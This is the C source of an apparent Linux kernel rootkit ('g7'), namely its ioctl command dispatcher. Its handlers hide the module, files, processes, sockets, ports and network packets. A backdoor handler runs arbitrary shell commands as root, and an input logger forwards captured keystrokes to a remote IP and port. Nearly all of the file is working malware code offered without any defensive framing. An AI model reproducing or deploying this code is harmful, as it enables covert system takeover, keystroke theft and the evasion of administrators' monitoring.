#include <linux/string.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>
#include <linux/proc_fs.h>

#include "channel.h"
#include "common.h"
#include "modhide.h"
#include "filehide.h"
#include "openhide.h"
#include "backdoor.h"
#include "pidhide.h"
#include "inputlog.h"
#include "ioctl.h"
#include "rootkit.h"
#include "sockhide.h"
#include "packhide.h"
#include "porthide.h"

#define BUFLEN 512

extern rootkit_t rootkit;

void
report_channels(void)
{
    DEBUG_NOTICE("-----------------------------------\n");
    DEBUG_NOTICE("listening on the following channels\n");
    DEBUG_NOTICE("%-24s %#10lx\n", "PING",     G7_PING);
    DEBUG_NOTICE("%-24s %#10lx\n", "MODHIDE",  G7_MODHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "FILEHIDE", G7_FILEHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "OPENHIDE", G7_OPENHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_PIDHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "TCPHIDE",  G7_TCPHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "UDPHIDE",  G7_UDPHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "PACKHIDE", G7_PACKHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "PORTHIDE", G7_PORTHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
    DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
    DEBUG_NOTICE("%-24s %#10lx\n", "LOGGING",  G7_LOGGING);
    DEBUG_NOTICE("-----------------------------------\n");
}

channel_t
detect_channel(unsigned cmd)
{
    switch (cmd) {
    case G7_PING:     return (channel_t){ "PING",     handle_ping     };
    case G7_MODHIDE:  return (channel_t){ "MODHIDE",  handle_modhide  };
    case G7_FILEHIDE: return (channel_t){ "FILEHIDE", handle_filehide };
    case G7_OPENHIDE: return (channel_t){ "OPENHIDE", handle_openhide };
    case G7_PIDHIDE:  return (channel_t){ "HIDEPID",  handle_pidhide  };
    case G7_TCPHIDE:  return (channel_t){ "TCPHIDE",  handle_tcphide  };
    case G7_UDPHIDE:  return (channel_t){ "UDPHIDE",  handle_udphide  };
    case G7_PACKHIDE: return (channel_t){ "PACKHIDE", handle_packhide };
    case G7_PORTHIDE: return (channel_t){ "PORTHIDE", handle_porthide };
    case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
    case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
    case G7_LOGGING:  return (channel_t){ "LOGGING",  handle_logging  };
    }

    return (channel_t){ "unknown", NULL };
}

int
handle_ping(unsigned long arg)
{
    char buf[BUFLEN];

    if (!(const char *)arg)
        return -ENOTTY;

    copy_from_user(buf, (const char *)arg, BUFLEN);
    if (!strcmp("PING", buf)) {
        buf[1] = 'O';
        copy_to_user((char *)arg, buf, BUFLEN);
    }

    return 0;
}

int
handle_modhide(unsigned long arg)
{
    long sarg = (long)arg;

    if (!sarg) {
        static char *argv[] = {
            "/bin/sh",
            "-c",
            "/sbin/rmmod g7",
            NULL
        };

        static char *envp[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            NULL
        };

        DEBUG_NOTICE("[g7] unloading module\n");

        unhide_module();
        rootkit.hiding_module = 0;

        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    } else if (sarg < 0) {
        unhide_module();
        rootkit.hiding_module = 0;

        DEBUG_NOTICE("[g7] modhide off\n");
    } else if (sarg > 0) {
        hide_module();
        rootkit.hiding_module = 1;

        DEBUG_NOTICE("[g7] modhide on\n");
    }

    return 0;
}

int
handle_filehide(unsigned long arg)
{
    long sarg = (long)arg;
    bool set = rootkit.hiding_files;

    if (sarg > 0 || (!sarg && (set ^ 1))) {
        hide_files();
        rootkit.hiding_files = 1;
    } else if (sarg < 0 || (!sarg && !(set ^ 1))) {
        unhide_files();
        rootkit.hiding_files = 0;
    }

    DEBUG_NOTICE("[g7] filehide %s\n", rootkit.hiding_files ? "on" : "off");

    return 0;
}

int
handle_openhide(unsigned long arg)
{
    long sarg = (long)arg;
    bool set = rootkit.hiding_open;

    if (sarg > 0 || (!sarg && (set ^ 1))) {
        hide_open();
        rootkit.hiding_open = 1;
    } else if (sarg < 0 || (!sarg && !(set ^ 1))) {
        unhide_open();
        rootkit.hiding_open = 0;
    }

    DEBUG_NOTICE("[g7] openhide %s\n", rootkit.hiding_open ? "on" : "off");

    return 0;
}

int
handle_pidhide(unsigned long arg)
{
    long sarg = (long)arg;

    if (!sarg) {
        unhide_pids();
        rootkit.hiding_pids = 0;
        DEBUG_NOTICE("[g7] pidhide off\n");
    } else if (sarg < 0) {
        unhide_pid((pid_t)(-sarg));
        DEBUG_NOTICE("[g7] unhiding pid %ld\n", -sarg);
    } else if (sarg > 0) {
        if (!rootkit.hiding_pids) {
            hide_pids();
            DEBUG_NOTICE("[g7] pidhide on\n");
        }

        hide_pid((pid_t)sarg);
        rootkit.hiding_pids = 1;
        DEBUG_NOTICE("[g7] hiding pid %ld\n", sarg);
    }

    return 0;
}

int
handle_tcphide(unsigned long arg)
{
    long sarg = (long)arg;

    if (!sarg) {
        // TODO also remove all sockets (tcp & udp) that are currently being hidden
        rootkit.hiding_sockets = 0;
        unhide_sockets();
        DEBUG_NOTICE("[g7] socket hiding off\n");
    } else if (sarg < 0) {
        unhide_port((port_t)-sarg, tcp4);
        unhide_port((port_t)-sarg, tcp6);
        DEBUG_NOTICE("[g7] unhiding tcp socket with port %ld\n", -sarg);
    } else if (sarg > 0) {
        if (!rootkit.hiding_sockets) {
            hide_sockets();
            DEBUG_NOTICE("[g7] socket hiding on\n");
        }

        hide_port((port_t)sarg, tcp4);
        hide_port((port_t)sarg, tcp6);
        DEBUG_NOTICE("[g7] hiding tcp socket with port %ld\n", sarg);
    }

    return 0;
}

int
handle_udphide(unsigned long arg)
{
    long sarg = (long)arg;

    if (!sarg) {
        unhide_sockets();
        rootkit.hiding_sockets = 0;
        DEBUG_NOTICE("[g7] socket hiding off\n");
    } else if (sarg < 0) {
        unhide_port((port_t)-sarg, udp4);
        unhide_port((port_t)-sarg, udp6);
        DEBUG_NOTICE("[g7] unhiding udp socket with port %ld\n", -sarg);
    } else if (sarg > 0) {
        if (!rootkit.hiding_sockets) {
            hide_sockets();
            DEBUG_NOTICE("[g7] socket hiding on\n");
        }
        hide_port((port_t)sarg, udp4);
        hide_port((port_t)sarg, udp6);
        DEBUG_NOTICE("[g7] hiding udp socket with port %ld\n", sarg);
    }

    return 0;
}

int
handle_packhide(unsigned long arg)
{
    char buf[BUFLEN];
    memset(buf, 0, BUFLEN);
    const char *sarg = (const char *)arg;

    if (!sarg) {
        rootkit.hiding_packets = 0;
        clear_hidden_ips();
        DEBUG_NOTICE("[g7] packet hiding off\n");
    } else if (!copy_from_user(buf, sarg, BUFLEN)
        && (strstr(buf, ":") || strstr(buf, ".")))
    {
        if (buf[0] == (char)1) {
            if (!rootkit.hiding_packets) {
                hide_packets();
                DEBUG_NOTICE("[g7] packet hiding on\n");
            }

            hide_ip(&buf[1]);
            rootkit.hiding_packets = 1;
            DEBUG_INFO("[g7] hiding packets from/to ip address %s\n", &buf[1]);
        } else if (buf[0] == (char)-1) {
            unhide_ip(&buf[1]);
            DEBUG_INFO("[g7] unhiding packets from/to ip address %s\n", &buf[1]);
        } else
            return -ENOTTY;

    } else
        return -ENOTTY;

    return 0;
}

int
handle_porthide(unsigned long arg)
{
    unsigned sarg = (unsigned)(arg % 65536);

    if (!sarg) {
        unhide_lports();
        rootkit.hiding_ports = 0;
        DEBUG_NOTICE("[g7] porthide off\n");
    } else if (sarg < 0) {
        unhide_lport((port_t)(-sarg));
        DEBUG_NOTICE("[g7] unhiding port %d\n", -sarg);
    } else if (sarg > 0) {
        if (!rootkit.hiding_ports) {
            hide_lports();
            DEBUG_NOTICE("[g7] porthide on\n");
        }

        hide_lport((port_t)sarg);
        rootkit.hiding_ports = 1;
        DEBUG_NOTICE("[g7] hiding port %d\n", sarg);
    }

    return 0;
}

int
handle_backdoor(unsigned long arg)
{
    char buf[BUFLEN];

    if (!(const char *)arg)
        return -ENOTTY;

    copy_from_user(buf, (const char *)arg, BUFLEN);

    char *argv[] = {
        "/bin/sh",
        "-c",
        buf,
        NULL
    };

    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    DEBUG_INFO("[g7] executing %s\n", buf);

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

int
handle_togglebd(unsigned long arg)
{
    char *msg;
    long sarg = (long)arg;

    if (!sarg) {
        unbackdoor();
        rootkit.backdoor = BD_OFF;
        msg = "off";
    } else if (sarg < 0) {
        unbackdoor();
        backdoor_read();
        rootkit.backdoor = BD_READ;
        msg = "hooked into `read`";
    } else if (sarg > 0) {
        unbackdoor();
        backdoor_tty();
        rootkit.backdoor = BD_TTY;
        msg = "hooked into `{p,t}ty`";
    }

    DEBUG_NOTICE("[g7] backdoor %s\n", msg);

    return 0;
}

int
handle_logging(unsigned long arg)
{
    char buf[BUFLEN];
    const char *sarg = (const char *)arg;

    if (!sarg) {
        unlog_input();
        rootkit.logging_input = 0;

        DEBUG_NOTICE("[g7] inputlogging off\n");
    } else if (!copy_from_user(buf, sarg, BUFLEN) && strstr(buf, ":")) {
        if (!rootkit.logging_input) {
            DEBUG_NOTICE("[g7] inputlogging on\n");
        } else
            unlog_input();

        char *port = buf;
        char *ip = strsep(&port, ":");

        log_input(ip, port);
        rootkit.logging_input = 1;

        DEBUG_INFO("[g7] forwarding stdin to socket %s:%s\n", ip, port);
    } else
        return -ENOTTY;

    return 0;
}
